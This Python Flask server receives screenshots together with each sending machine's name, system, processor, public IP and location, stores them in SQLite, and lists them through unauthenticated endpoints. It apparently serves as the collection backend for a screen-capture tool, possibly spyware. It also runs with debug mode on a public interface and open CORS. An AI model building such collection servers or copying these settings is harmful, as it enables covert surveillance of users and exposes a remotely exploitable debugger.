from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import sqlite3
import io
import logging
import ssl

# Configure logging to save logs to a file
logging.basicConfig(filename='app.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)
CORS(app)

# Database setup
def init_db():
    with sqlite3.connect("screenshots.db") as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                computer_name TEXT,
                system TEXT,
                processor TEXT,
                public_ip TEXT,
                image_file BLOB,
                location TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)

init_db()

# Helper function to get database connection
def get_db_connection():
    conn = sqlite3.connect("screenshots.db")
    conn.row_factory = sqlite3.Row  # This enables column access by name
    return conn

@app.route('/upload', methods=['POST'])
def upload_screenshot():
    client_ip = request.remote_addr
    logging.info(f"Upload request from IP: {client_ip}")
    
    data = request.form
    required_fields = ["computer_name", "system", "processor", "public_ip", "location"]
    
    # Check for required fields
    if not all(field in data for field in required_fields) or "image_file" not in request.files:
        return jsonify({"error": "Missing required data"}), 400
    
    image_data = request.files["image_file"].read()
    
    with get_db_connection() as conn:
        conn.execute("""
            INSERT INTO screenshots (computer_name, system, processor, public_ip, image_file, location)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (data["computer_name"], data["system"], data["processor"], 
              data["public_ip"], image_data, data["location"]))
    
    return jsonify({"message": "Screenshot saved successfully"}), 201

@app.route('/data', methods=['GET'])
def get_data():
    client_ip = request.remote_addr
    logging.info(f"Data request from IP: {client_ip}")
    
    ids = request.args.getlist('id')
    last_n = request.args.get('last_n', type=int)
    id_range_start = request.args.get('range_start', type=int)
    id_range_end = request.args.get('range_end', type=int)
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        
        if ids:
            placeholders = ','.join('?' for _ in ids)
            query = f"SELECT id, computer_name, system, processor, public_ip, location, timestamp FROM screenshots WHERE id IN ({placeholders})"
            cursor.execute(query, ids)
        elif last_n:
            query = "SELECT id, computer_name, system, processor, public_ip, location, timestamp FROM screenshots ORDER BY timestamp DESC LIMIT ?"
            cursor.execute(query, (last_n,))
        elif id_range_start and id_range_end:
            query = "SELECT id, computer_name, system, processor, public_ip, location, timestamp FROM screenshots WHERE id BETWEEN ? AND ?"
            cursor.execute(query, (id_range_start, id_range_end))
        else:
            return jsonify({"error": "Please provide id, last_n, or range parameters"}), 400
        
        result = [dict(row) for row in cursor.fetchall()]
        
        # Add image URL to each result
        for entry in result:
            entry["image_url"] = f"/image/{entry['id']}"
    
    return jsonify({"data": result})

@app.route('/image/<int:image_id>')
def get_image(image_id):
    client_ip = request.remote_addr
    logging.info(f"Image request from IP: {client_ip} for image ID: {image_id}")
    
    with get_db_connection() as conn:
        image_data = conn.execute("SELECT image_file FROM screenshots WHERE id = ?", 
                                (image_id,)).fetchone()
    
    if not image_data:
        return jsonify({"error": "Image not found"}), 404
        
    return send_file(io.BytesIO(image_data[0]), mimetype='image/png')

@app.route('/page/<int:page_number>')
def get_page(page_number):
    client_ip = request.remote_addr
    logging.info(f"Page request from IP: {client_ip} for page number: {page_number}")
    
    items_per_page = 10
    offset = (page_number - 1) * items_per_page
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, computer_name, system, processor, public_ip, location, timestamp 
            FROM screenshots 
            ORDER BY timestamp DESC 
            LIMIT ? OFFSET ?
        """, (items_per_page, offset))
        
        result = [dict(row) for row in cursor.fetchall()]
        
        # Add image URL to each result
        for entry in result:
            entry["image_url"] = f"/image/{entry['id']}"
    
    return jsonify({"data": result})

@app.route('/total_pages')
def get_total_pages():
    client_ip = request.remote_addr
    logging.info(f"Total pages request from IP: {client_ip}")
    
    items_per_page = 10
    
    with get_db_connection() as conn:
        total_items = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
    
    total_pages = (total_items + items_per_page - 1) // items_per_page
    return jsonify({"total_pages": total_pages})

@app.route('/total_items')
def get_total_items():
    client_ip = request.remote_addr
    logging.info(f"Total items request from IP: {client_ip}")
    
    with get_db_connection() as conn:
        total_items = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
    
    return jsonify({"total_items": total_items})

if __name__ == '__main__':
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='path/to/fullchain.pem', keyfile='path/to/privkey.pem')
    app.run(host="0.0.0.0", port=5001, debug=True, ssl_context=context)